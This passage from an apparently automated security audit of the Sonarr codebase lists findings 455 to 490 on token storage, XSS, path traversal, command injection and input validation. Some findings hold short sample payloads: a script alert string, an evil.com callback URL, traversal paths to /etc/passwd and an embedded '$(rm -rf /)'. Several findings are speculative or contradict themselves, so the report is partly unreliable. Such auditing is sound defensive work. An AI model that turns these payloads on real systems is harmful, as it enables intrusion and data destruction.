Error messages might reveal internal system details, API endpoints, or configuration information that could be exploited by attackers.

**Proof of Concept:**
When an API connection fails, the error message might include the URL and potentially sensitive information about the API call.

**How to Test:**
1. Force an API connection error in AniList import
2. Check the logs for error messages
3. Verify if sensitive information is exposed in error messages

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCore_ImportLists_AniList_List_AniListImportcs.py`
---

### 456. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/ImportLists/Trakt/TraktImportBase.cs
**Line:** 40

**Description:**
The TraktImportBase stores access tokens and refresh tokens in settings without proper encryption, potentially exposing them in cleartext.

**Evidence:**
```
AccessToken, RefreshToken, and Expires fields are stored directly in settings without encryption or obfuscation.
```

**Impact:**
If the database is compromised, access tokens and refresh tokens can be directly read, allowing unauthorized access to Trakt API.

**Proof of Concept:**
Database dump would reveal Trakt access tokens in cleartext, allowing attackers to make API calls on behalf of the user.

**How to Test:**
1. Create a Trakt import list with valid credentials
2. Check database storage of settings
3. Verify if tokens are stored in cleartext

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_ImportLists_Trakt_TraktImportBasecs.py`
---

### 457. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/ImportLists/MyAnimeList/MyAnimeListImport.cs
**Line:** 40

**Description:**
The MyAnimeListImport stores access tokens and refresh tokens in settings without proper encryption, potentially exposing them in cleartext.

**Evidence:**
```
AccessToken, RefreshToken, and Expires fields are stored directly in settings without encryption or obfuscation.
```

**Impact:**
If the database is compromised, access tokens and refresh tokens can be directly read, allowing unauthorized access to MyAnimeList API.

**Proof of Concept:**
Database dump would reveal MyAnimeList access tokens in cleartext, allowing attackers to make API calls on behalf of the user.

**How to Test:**
1. Create a MyAnimeList import list with valid credentials
2. Check database storage of settings
3. Verify if tokens are stored in cleartext

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_ImportLists_MyAnimeList_MyAnimeListImportcs.py`
---

### 458. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/ImportLists/Simkl/SimklImportBase.cs
**Line:** 40

**Description:**
The SimklImportBase stores access tokens and refresh tokens in settings without proper encryption, potentially exposing them in cleartext.

**Evidence:**
```
AccessToken, RefreshToken, and Expires fields are stored directly in settings without encryption or obfuscation.
```

**Impact:**
If the database is compromised, access tokens and refresh tokens can be directly read, allowing unauthorized access to Simkl API.

**Proof of Concept:**
Database dump would reveal Simkl access tokens in cleartext, allowing attackers to make API calls on behalf of the user.

**How to Test:**
1. Create a Simkl import list with valid credentials
2. Check database storage of settings
3. Verify if tokens are stored in cleartext

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_ImportLists_Simkl_SimklImportBasecs.py`
---

### 459. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/ImportLists/Rss/Plex/PlexRssImportParser.cs
**Line:** 30

**Description:**
The PlexRssImportParser extracts title information from RSS feed items without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The Title field in ImportListItemInfo is set directly from item.TryGetValue("title", "Unknown") without HTML escaping.
```

**Impact:**
If RSS feed items contain HTML content in titles, this could lead to XSS when displaying the titles in the UI.

**Proof of Concept:**
If an RSS feed contains a title like "<script>alert('XSS')</script>My Show", this could be executed when displayed in the UI.

**How to Test:**
1. Create an RSS import list with a feed containing HTML in titles
2. Verify if the titles are properly escaped in the UI
3. Check for potential XSS execution points

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_ImportLists_Rss_Plex_PlexRssImportParsercs.py`
---

### 460. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/ImportLists/Rss/RssImportBaseSettings.cs
**Line:** 15

**Description:**
The RssImportBaseSettings uses basic validation for URL input, potentially allowing malformed URLs that could cause issues.

**Evidence:**
```
The validation only checks if URL is not empty but doesn't validate URL format or structure.
```

**Impact:**
Malformed URLs could cause API connection failures or unexpected behavior when fetching RSS feeds.

**Proof of Concept:**
Submit an RSS import list with a malformed URL like "not_a_url" or "http://" without domain.

**How to Test:**
1. Create an RSS import list with various malformed URLs
2. Verify if the system properly handles URL validation
3. Check API responses for unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_ImportLists_Rss_RssImportBaseSettingscs.py`
---

### 461. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/ImportLists/MyAnimeList/MyAnimeListSettings.cs
**Line:** 20

**Description:**
The MyAnimeListSettings uses basic validation for ListStatus input, potentially allowing invalid enum values.

**Evidence:**
```
The validation checks if ListStatus is defined but doesn't validate the range or type properly.
```

**Impact:**
Invalid ListStatus values could cause API errors or unexpected behavior when fetching anime lists.

**Proof of Concept:**
Submit a MyAnimeList import list with ListStatus = 999 which is not a valid enum value.

**How to Test:**
1. Create a MyAnimeList import list with invalid ListStatus values
2. Verify if the system properly handles invalid enum values
3. Check API responses for unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_ImportLists_MyAnimeList_MyAnimeListSettingscs.py`
---

### 462. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/ImportLists/Plex/PlexImport.cs
**Line:** 110

**Description:**
The PlexImport class handles OAuth request actions that return JSON responses containing user-provided data without proper sanitization, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The RequestAction method returns objects with user-provided data (accessToken) without HTML escaping, and the method handles OAuth flow parameters that could be manipulated by attackers.
```

**Impact:**
An attacker could inject malicious JavaScript into the OAuth flow responses, potentially stealing authentication tokens or performing actions on behalf of authenticated users.

**Proof of Concept:**
An attacker could craft a malicious OAuth callback URL with script tags in parameters that would be returned in the JSON response, e.g., callbackUrl='http://evil.com?script=alert(1)'

**How to Test:**
1. Send a request to the Plex import list with crafted OAuth parameters
2. Observe if the returned JSON response contains unsanitized user input
3. Verify if JavaScript execution is possible in the context where the response is used

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_ImportLists_Plex_PlexImportcs.py`
---

### 463. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/ImportLists/Plex/PlexImport.cs
**Line:** 120

**Description:**
The PlexImport class does not properly validate OAuth parameters, allowing potentially malicious values to be processed.

**Evidence:**
```
In the RequestAction method, parameters like callbackUrl, id, code, and pinId are validated for null/empty but not for length, format, or content restrictions.
```

**Impact:**
Maliciously crafted OAuth parameters could cause unexpected behavior, potentially leading to injection attacks or bypassing authentication checks.

**Proof of Concept:**
Send a request with callbackUrl parameter containing 1000+ characters or special characters that might cause parsing issues or buffer overflows.

**How to Test:**
1. Send OAuth requests with extremely long parameter values
2. Test with special characters and control characters in parameters
3. Verify parameter validation and error handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_ImportLists_Plex_PlexImportcs.py`
---

### 464. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/ImportLists/Sonarr/SonarrV3Proxy.cs
**Line:** 110

**Description:**
The SonarrV3Proxy class constructs API resource paths using user-provided settings without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The Execute method constructs resource paths using settings.BaseUrl and resource parameters without validating that the constructed URL doesn't contain path traversal sequences.
```

**Impact:**
An attacker could manipulate the BaseUrl setting to access files outside the intended API scope or inject malicious paths.

**Proof of Concept:**
Set a BaseUrl like 'http://sonarr/api/v3/../../../etc/passwd' to potentially access system files through the API.

**How to Test:**
1. Configure Sonarr import list with a crafted BaseUrl
2. Verify that path traversal sequences are not properly sanitized
3. Test if API calls can access unintended resources

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_ImportLists_Sonarr_SonarrV3Proxycs.py`
---

### 465. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/ImportLists/Simkl/SimklSettingsBase.cs
**Line:** 35

**Description:**
The SimklSettingsBase class stores sensitive authentication tokens (AccessToken, RefreshToken) in the database without encryption, potentially exposing them to unauthorized access.

**Evidence:**
```
AccessToken and RefreshToken properties are stored as plain text in the database without any encryption or obfuscation mechanism.
```

**Impact:**
If the database is compromised, attackers gain access to all Simkl authentication tokens, allowing them to access user's Simkl accounts and potentially other services.

**Proof of Concept:**
Dump the database and observe that AccessToken and RefreshToken values are stored in plain text format without any encryption.

**How to Test:**
1. Check database schema for Simkl settings storage
2. Verify that tokens are stored without encryption
3. Test database access with compromised credentials

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_ImportLists_Simkl_SimklSettingsBasecs.py`
---

### 466. Sensitive Information in URL (CWE-319)

**File:** src/NzbDrone.Core/ImportLists/Simkl/User/SimklUserRequestGenerator.cs
**Line:** 30

**Description:**
The SimklUserRequestGenerator class includes sensitive authentication tokens in HTTP headers but doesn't properly secure the API calls.

**Evidence:**
```
The AccessToken is passed in the Authorization header but the URL construction doesn't validate or sanitize the base URL, potentially exposing tokens in logs or error messages.
```

**Impact:**
If the API endpoint URL is logged or exposed in error messages, sensitive tokens could be leaked to unauthorized parties.

**Proof of Concept:**
Configure a Simkl import list with a malicious BaseUrl that logs or exposes the request URL, potentially revealing the access token in logs.

**How to Test:**
1. Monitor logs for API request URLs
2. Configure import list with a URL that might expose tokens
3. Verify token exposure in error messages or logs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-319_src_NzbDroneCore_ImportLists_Simkl_User_SimklUserRequestGeneratorcs.py`
---

### 467. Resource Exhaustion (CWE-770)

**File:** src/NzbDrone.Core/ImportLists/Plex/PlexListRequestGenerator.cs
**Line:** 25

**Description:**
The PlexListRequestGenerator class uses a fixed maximum page count (MaxPages = 10) without proper validation, potentially leading to resource exhaustion.

**Evidence:**
```
The GetSeriesRequest method uses a fixed loop with MaxPages = 10, but there's no validation or limit on the page size or number of requests that could be generated.
```

**Impact:**
An attacker could potentially cause excessive API calls or memory usage by manipulating the page count or request parameters.

**Proof of Concept:**
Configure a Plex import list with a very large page size or number of pages that could cause excessive API calls or memory consumption.

**How to Test:**
1. Configure import list with large page parameters
2. Monitor API call volume and memory usage
3. Test with malicious page count values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCore_ImportLists_Plex_PlexListRequestGeneratorcs.py`
---

### 468. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/ImportLists/Sonarr/SonarrImport.cs
**Line:** 100

**Description:**
The SonarrImport class does not properly validate API keys before making requests, potentially allowing unauthorized access to remote Sonarr instances.

**Evidence:**
```
The RequestAction method checks for API key null/empty but doesn't validate the API key's validity or permissions before making API calls.
```

**Impact:**
An attacker with a valid API key could potentially access other Sonarr instances or perform unauthorized operations.

**Proof of Concept:**
Use a valid but unauthorized API key to make requests to a Sonarr instance, observing if unauthorized operations are permitted.

**How to Test:**
1. Test with valid but unauthorized API keys
2. Verify API key validation and error handling
3. Check if unauthorized operations are permitted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_ImportLists_Sonarr_SonarrImportcs.py`
---

### 469. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core/ImportLists/Sonarr/SonarrV3Proxy.cs
**Line:** 120

**Description:**
The SonarrV3Proxy class doesn't validate the authenticity of data returned from remote Sonarr instances, potentially allowing data injection attacks.

**Evidence:**
```
The Execute method deserializes JSON responses without validating the source or content of the data, relying on the remote API to provide valid data.
```

**Impact:**
An attacker could potentially inject malicious data into the Sonarr API responses, affecting how data is processed and displayed.

**Proof of Concept:**
Modify a Sonarr API response to include unexpected fields or values that could cause deserialization errors or unexpected behavior.

**How to Test:**
1. Intercept and modify Sonarr API responses
2. Verify data validation and error handling
3. Test with malformed JSON responses

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCore_ImportLists_Sonarr_SonarrV3Proxycs.py`
---

### 470. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/UsenetClientBase.cs
**Line:** 64

**Description:**
The code downloads NZB files from URLs provided by indexers without proper validation or sanitization, potentially allowing command injection through malicious URLs.

**Evidence:**
```
The code uses indexer.GetDownloadRequest(url) where 'url' comes directly from indexer and is used in HttpRequest without validation.
```

**Impact:**
An attacker could manipulate indexer URLs to inject commands during download operations, potentially leading to arbitrary code execution.

**Proof of Concept:**
If an indexer returns a URL like 'http://example.com/$(rm -rf /)file.nzb', the download process might execute shell commands during URL processing or file handling.

**How to Test:**
1. Configure an indexer to return malicious URLs with shell command injection patterns
2. Trigger a download with such URL
3. Monitor if shell commands are executed during download process

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_UsenetClientBasecs.py`
---

### 471. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/UsenetClientBase.cs
**Line:** 64

**Description:**
The code accepts download URLs from external indexers without validating their format or content, potentially leading to various injection attacks.

**Evidence:**
```
The code directly uses 'remoteEpisode.Release.DownloadUrl' in HttpRequest without validation or sanitization.
```

**Impact:**
Malformed URLs could cause unexpected behavior, redirect to malicious sites, or enable path traversal attacks.

**Proof of Concept:**
An indexer could return a URL like 'http://example.com/../../../etc/passwd' which might be processed incorrectly during download.

**How to Test:**
1. Configure an indexer to return URLs with special characters or path traversal sequences
2. Trigger download with such URLs
3. Check if URL handling properly validates and sanitizes inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_UsenetClientBasecs.py`
---

### 472. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/Download/TorrentClientBase.cs
**Line:** 129

**Description:**
The code processes torrent files from external sources without proper validation, potentially allowing code injection through torrent metadata.

**Evidence:**
```
Torrent files are downloaded and processed without validation of their content, particularly in the DownloadFromWebUrl method.
```

**Impact:**
Malicious torrent files could contain code that gets executed during processing, potentially leading to arbitrary code execution.

**Proof of Concept:**
A malicious torrent file could contain metadata that triggers unexpected behavior when parsed by the torrent file reader.

**How to Test:**
1. Create a malicious torrent file with unexpected metadata
2. Configure indexer to return this torrent file
3. Trigger download and observe processing behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_Download_TorrentClientBasecs.py`
---

### 473. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Download/NzbValidationService.cs
**Line:** 30

**Description:**
The code accesses XML elements in NZB files without proper bounds checking, potentially leading to array index out of bounds errors.

**Evidence:**
```
The code uses XDocument.Load() and accesses elements without checking if they exist before accessing their properties.
```

**Impact:**
Malformed NZB files could cause array index out of bounds exceptions, potentially leading to application crashes or information disclosure.

**Proof of Concept:**
A malformed NZB file with missing or unexpected XML elements could cause the validation service to throw exceptions.

**How to Test:**
1. Create a malformed NZB file with missing elements
2. Try to validate such file
3. Check if application handles exceptions properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Download_NzbValidationServicecs.py`
---

### 474. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Download/TorrentClientBase.cs
**Line:** 180

**Description:**
The code processes torrent file paths without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The code uses torrent.Path directly without validating that it's within expected directories.
```

**Impact:**
Malicious torrent files could contain paths that traverse outside of expected directories, potentially allowing file system access.

**Proof of Concept:**
A torrent file with path like '../../../etc/passwd' could be processed and potentially cause file system access outside of expected directories.

**How to Test:**
1. Create a torrent file with path traversal sequences
2. Process such torrent file
3. Check if path validation prevents directory traversal

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_TorrentClientBasecs.py`
---

### 475. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/RQBit/RQbitProxy.cs
**Line:** 40

**Description:**
The code stores API responses in memory without proper sanitization, potentially exposing sensitive data.

**Evidence:**
```
The proxy stores raw API responses from RQBit without sanitizing potentially sensitive data.
```

**Impact:**
Sensitive data from RQBit API responses could be exposed through logs or other data structures.

**Proof of Concept:**
If RQBit API returns sensitive information in responses, this data could be logged or exposed without sanitization.

**How to Test:**
1. Configure RQBit with sensitive data in API responses
2. Trigger API calls
3. Check if sensitive data is properly sanitized in logs or responses

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_RQBit_RQbitProxycs.py`
---

### 476. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Core/Download/UsenetClientBase.cs
**Line:** 82

**Description:**
The code catches exceptions but may not properly handle all exceptional conditions, potentially leading to unhandled exceptions.

**Evidence:**
```
Multiple catch blocks for different exception types but some exceptions might not be properly handled or logged.
```

**Impact:**
Uncaught exceptions could cause application instability or information disclosure.

**Proof of Concept:**
If an unexpected exception type is thrown during download, it might not be properly caught and handled.

**How to Test:**
1. Simulate unexpected exception types during download
2. Check if all exceptions are properly caught and logged
3. Verify application stability

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCore_Download_UsenetClientBasecs.py`
---

### 477. Improper Control of a Resource Through Time (CWE-707)

**File:** src/NzbDrone.Core/Download/DownloadClientBase.cs
**Line:** 49

**Description:**
The code uses a retry strategy with potentially long-running operations that might not properly manage resource lifecycles.

**Evidence:**
```
The ResiliencePipeline uses retry logic but doesn't explicitly manage resource cleanup for long-running operations.
```

**Impact:**
Long-running download operations might not properly release resources, leading to resource leaks.

**Proof of Concept:**
Extended download operations with multiple retries might accumulate resources without proper cleanup.

**How to Test:**
1. Configure long-running downloads with multiple retries
2. Monitor resource usage over time
3. Check for proper resource cleanup

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_DownloadClientBasecs.py`
---

### 478. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/FreeboxDownload/FreeboxDownloadSettings.cs
**Line:** 32

**Description:**
The Category validation regex allows only lowercase letters and hyphens but doesn't validate for path traversal or special characters that could be exploited in file operations.

**Evidence:**
```
RuleFor(c => c.Category).Matches(@"^\.?[-a-z]*$", RegexOptions.IgnoreCase) - allows only a-z and - characters with optional leading dot.
```

**Impact:**
While the validation is strict, it doesn't prevent all potential injection vectors that could be exploited in downstream file operations or path handling.

**Proof of Concept:**
A category like "../malicious" could potentially be used in file operations where path traversal is not properly handled, even though the validation prevents it.

**How to Test:**
1. Set a category with special characters like "../test" or "test\..\test"
2. Try to add torrents with such categories
3. Verify if the category is properly sanitized in file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_FreeboxDownload_FreeboxDownloadSettingscs.py`
---

### 479. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/FreeboxDownload/FreeboxDownloadSettings.cs
**Line:** 58

**Description:**
The AppToken setting is stored as plain text in the configuration without proper encryption or obfuscation, making it vulnerable to exposure.

**Evidence:**
```
AppToken is defined as a simple string property with PrivacyLevel.Password but no encryption mechanism is shown in the code.
```

**Impact:**
If the configuration file is compromised, the AppToken can be directly used to authenticate with the Freebox API, potentially allowing full access to the Freebox download functionality.

**Proof of Concept:**
An attacker with access to the configuration file can extract the AppToken and use it to authenticate with the Freebox API directly without needing user credentials.

**How to Test:**
1. Check the configuration file for AppToken storage
2. Verify if the token is encrypted or stored in plain text
3. Try to authenticate with the Freebox API using the extracted token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_FreeboxDownload_FreeboxDownloadSettingscs.py`
---

### 480. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Download/Clients/Flood/Flood.cs
**Line:** 100

**Description:**
The HandleTags method uses array indexing without proper bounds checking when accessing AdditionalTags enum values.

**Evidence:**
```
In the switch statement, there's no default case to handle unexpected AdditionalTag values, and the code assumes all values are valid enum values.
```

**Impact:**
If an invalid AdditionalTag value is provided, the code could throw an exception or behave unexpectedly, potentially causing download client operations to fail.

**Proof of Concept:**
If the AdditionalTags property contains an invalid enum value (e.g., 999), the switch statement will throw an exception when trying to process that tag.

**How to Test:**
1. Configure Flood download client with an invalid AdditionalTag value
2. Try to add a torrent with tags
3. Verify if the system handles invalid tag values gracefully

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Download_Clients_Flood_Floodcs.py`
---

### 481. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/uTorrent/UTorrentProxy.cs
**Line:** 112

**Description:**
The AddTorrentFromFile method uses file content directly in form uploads without proper sanitization, potentially allowing command injection in the upload process.

**Evidence:**
```
The method uses AddFormUpload with fileContent parameter without validating or sanitizing the content before upload.
```

**Impact:**
If the uploaded file content contains malicious data that gets processed by uTorrent, it could lead to command injection or other security issues.

**Proof of Concept:**
A specially crafted torrent file could contain embedded commands or malicious data that gets executed when uTorrent processes the file.

**How to Test:**
1. Create a malicious torrent file with embedded commands
2. Try to add it via AddTorrentFromFile method
3. Monitor uTorrent for command execution or unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_uTorrent_UTorrentProxycs.py`
---

### 482. Missing Encryption of Sensitive Data (CWE-311)

**File:** src/NzbDrone.Core/Download/Clients/Flood/Flood.cs
**Line:** 120

**Description:**
The Flood client stores and processes authentication credentials without explicit encryption, potentially exposing sensitive data.

**Evidence:**
```
Username and Password are stored as plain text in FloodSettings without encryption mechanisms.
```

**Impact:**
If configuration files or memory are compromised, the Flood credentials can be directly used to access the Flood API.

**Proof of Concept:**
An attacker with access to the configuration can extract the Flood username and password and use them to authenticate with the Flood API.

**How to Test:**
1. Check configuration storage for Flood credentials
2. Verify if credentials are encrypted or stored in plain text
3. Try to authenticate with Flood API using extracted credentials

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-311_src_NzbDroneCore_Download_Clients_Flood_Floodcs.py`
---

### 483. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Flood/FloodProxy.cs
**Line:** 120

**Description:**
The Flood proxy doesn't validate or sanitize destination paths before using them, potentially allowing path traversal attacks.

**Evidence:**
```
The AddTorrentByFile and AddTorrentByUrl methods pass destination parameter directly to API calls without validation.
```

**Impact:**
An attacker could potentially manipulate the destination path to write files to unexpected locations or access restricted directories.

**Proof of Concept:**
If the Flood API accepts a destination parameter, an attacker could specify a path like "../../../etc/passwd" to potentially write to system files.

**How to Test:**
1. Configure Flood with a custom destination path
2. Try to add a torrent with a destination path containing path traversal sequences
3. Verify if the system properly validates or sanitizes the destination path

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Flood_FloodProxycs.py`
---

### 484. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Download/Clients/Flood/FloodProxy.cs
**Line:** 140

**Description:**
The Flood proxy uses string interpolation for API calls but doesn't validate or sanitize the input parameters that could be used in format strings.

**Evidence:**
```
The code uses string interpolation for API calls but doesn't validate the parameters that could be used in format strings.
```

**Impact:**
If API parameters contain format specifiers, they could be used to manipulate the API call structure or inject malicious parameters.

**Proof of Concept:**
If a tag name contains format specifiers like "%s" or "%d", it could potentially be used to manipulate API calls or inject unexpected parameters.

**How to Test:**
1. Configure Flood with tags containing format specifiers
2. Try to add torrents with such tags
3. Monitor API calls for unexpected parameter handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Download_Clients_Flood_FloodProxycs.py`
---

### 485. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Aria2/Aria2.cs
**Line:** 104

**Description:**
The GetOutputPath method in Aria2 class does not validate the input paths from Aria2Status.Files, which could lead to path traversal vulnerabilities when processing torrent files.

**Evidence:**
```
The GetOutputPath method uses torrent.Files.Select(f => f.Path).ToList().GetLongestCommonPath() without validating the individual file paths from Aria2File objects.
```

**Impact:**
An attacker could potentially manipulate torrent files to include malicious paths that could lead to directory traversal when downloading files.

**Proof of Concept:**
If a torrent contains files with paths like '../../../../etc/passwd' or '\\malicious-server\share\file.txt', these paths could be used to traverse directories when downloading files.

**How to Test:**
1. Create a torrent with malicious file paths
2. Add it to Aria2
3. Check if the system properly validates and sanitizes these paths during download operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Aria2_Aria2cs.py`
---

### 486. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/Aria2/Aria2.cs
**Line:** 104

**Description:**
The GetOutputPath method in Aria2 class uses paths from Aria2Status.Files without proper sanitization, which could lead to command injection if these paths are used in shell commands.

**Evidence:**
```
The method returns paths from Aria2File objects directly without sanitizing them, and these paths are used in file operations that could be vulnerable to command injection.
```

**Impact:**
If Aria2 paths are used in shell commands or system calls, an attacker could inject malicious commands through specially crafted torrent files.

**Proof of Concept:**
If Aria2 paths are used in system commands like 'cp', 'mv', or 'rm', an attacker could inject commands through paths containing semicolons, pipes, or other shell metacharacters.

**How to Test:**
1. Create a torrent with paths containing shell metacharacters
2. Add it to Aria2
3. Monitor if these paths are used in system commands
4. Check for command injection vulnerabilities in file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_Aria2_Aria2cs.py`
---

### 487. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Aria2/Aria2Settings.cs
**Line:** 26

**Description:**
The Aria2Settings class contains a hardcoded default secret token that could be easily discovered by attackers.

**Evidence:**
```
The SecretToken property has a hardcoded default value 'MySecretToken' in the constructor.
```

**Impact:**
If the default token is not changed by users, it could be easily discovered and used to authenticate with Aria2, potentially allowing unauthorized access to the download client.

**Proof of Concept:**
An attacker who can access the Sonarr configuration or code can easily find the hardcoded token 'MySecretToken' and use it to make authenticated requests to Aria2.

**How to Test:**
1. Check the Aria2Settings constructor for hardcoded values
2. Verify if the default token is used in production
3. Test if authentication works with the default token

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Aria2_Aria2Settingscs.py`
---

### 488. Clear Text Transmission of Sensitive Data (CWE-319)

**File:** src/NzbDrone.Core/Download/Clients/Aria2/Aria2.cs
**Line:** 104

**Description:**
The Aria2 client does not enforce SSL/TLS for communication with the Aria2 daemon, potentially exposing sensitive data in transit.

**Evidence:**
```
The Aria2Settings class has a UseSsl property but the default implementation doesn't enforce SSL for all communications.
```

**Impact:**
Sensitive data including authentication tokens and download information could be intercepted during transmission between Sonarr and Aria2.

**Proof of Concept:**
If Aria2 is configured without SSL, network traffic between Sonarr and Aria2 can be captured and sensitive information like authentication tokens can be extracted.

**How to Test:**
1. Configure Aria2 without SSL
2. Monitor network traffic between Sonarr and Aria2
3. Check if authentication tokens and sensitive data are transmitted in clear text

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-319_src_NzbDroneCore_Download_Clients_Aria2_Aria2cs.py`
---

### 489. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/Aria2/Aria2.cs
**Line:** 104

**Description:**
The Aria2 client uses a hardcoded default secret token that may not be properly validated or changed by users.

**Evidence:**
```
The SecretToken property has a default value 'MySecretToken' that could be used without proper user configuration.
```

**Impact:**
If users don't change the default token, unauthorized parties could access the Aria2 daemon and potentially control downloads.

**Proof of Concept:**
An attacker with access to Sonarr configuration can use the default token 'MySecretToken' to make authenticated requests to Aria2.

**How to Test:**
1. Check if default token is used in production
2. Test authentication with default token
3. Verify if token validation is performed properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_Aria2_Aria2cs.py`
---

### 490. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/Deluge/DelugeProxy.cs
**Line:** 150

**Description:**
The DelugeProxy class uses dynamic objects for configuration options that could be vulnerable to command injection if not properly sanitized.

**Evidence:**
```
The AddTorrentFromMagnet method uses dynamic options objects that could contain unvalidated user input.
```

**Impact:**
